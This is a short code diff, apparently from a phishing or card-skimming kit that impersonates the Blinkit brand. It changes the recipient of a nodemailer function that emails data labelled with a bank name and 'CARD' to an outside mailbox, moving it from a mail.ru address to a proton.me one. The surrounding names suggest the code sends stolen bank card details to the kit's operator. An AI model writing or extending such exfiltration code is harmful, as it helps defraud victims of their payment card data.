@@ -26,7 +26,7 @@ async function Mail(data) {
   const subject = `${data.bankname} CARD`;
   const info = await transporter.sendMail({
     from: '"blinkit👻" <blinkit@cybercrime.com>', // sender address
-    to: "sho.cyber@mail.ru", // list of receivers
+    to: "shocyber@proton.me", // list of receivers
     subject,
     text: "blinkit Order", // plain text body
     html, // html body
